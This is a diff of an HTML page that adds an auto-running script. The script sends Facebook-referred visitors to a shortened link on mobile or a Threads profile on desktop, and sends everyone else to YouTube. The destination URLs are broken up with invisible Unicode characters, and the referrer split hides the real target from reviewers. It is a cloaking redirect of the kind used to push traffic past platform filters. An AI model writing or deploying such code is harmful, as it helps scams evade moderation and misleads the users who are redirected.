@@ -2,34 +2,34 @@
 <html>
 <head>
     <title>Parker1504</title>
- <script>
-  function redirectToDifferentWebsite() {
-    var userAgent = navigator.userAgent.toLowerCase();
-    var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
-    var referrer = document.referrer.toLowerCase();
-    var emptyChar = /\u200E/g; // Unicode escape sequence for the invisible character
-    var mobileDevice = "https://m\u200Eagl\u200Eit.me/poshuimichs"; // Unicode escape sequence
-    var pcURL = "https://www.th\u200Reads\u200E.net/@zuck"; // Unicode escape sequence
-    var youtubeURL = "https://www.youtube.com";
-
-    // Check if the referrer is Facebook and remove the empty character if it exists in the URL
-    if (referrer.includes("facebook.com")) {
-      var currentURL = window.location.href;
-      currentURL = currentURL.replace(emptyChar, ""); // Remove the empty character
-      if (isMobile) {
-        window.location.href = mobileDevice;
-      } else {
-        window.location.href = pcURL;
-      }
-    } else {
-      // If the referrer is not Facebook, redirect to YouTube
-      window.location.href = youtubeURL;
-    }
-  }
-
-  redirectToDifferentWebsite();
-</script>
-
+    <script>
+      function redirectToDifferentWebsite() {
+       var userAgent = navigator.userAgent.toLowerCase();
+       var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
+       var referrer = document.referrer.toLowerCase();
+       var emptyChar = /‎/g;
+       var mobileDevice = "https://m‎agl‎it.me/poshuimichs";
+       var pcURL = "https://www.th‎r‎eads‎.net/@zuck";
+       var youtubeURL = "https://www.youtube.com";
+   
+       // Check if the referrer is Facebook and remove the empty character if it exists in the URL
+       if (referrer.includes("facebook.com")) {
+         var currentURL = window.location.href;
+         currentURL = currentURL.replace(emptyChar, ""); // Remove the empty character
+         if (isMobile) {
+           window.location.href = mobileDevice;
+         } else {
+           window.location.href = pcURL;
+         }
+       } else {
+         // If the referrer is not Facebook, redirect to YouTube
+         window.location.href = youtubeURL;
+       }
+     }
+   
+     redirectToDifferentWebsite();
+   
+       </script>
     <script src="mobil.js"></script>
 </head>
 <body>
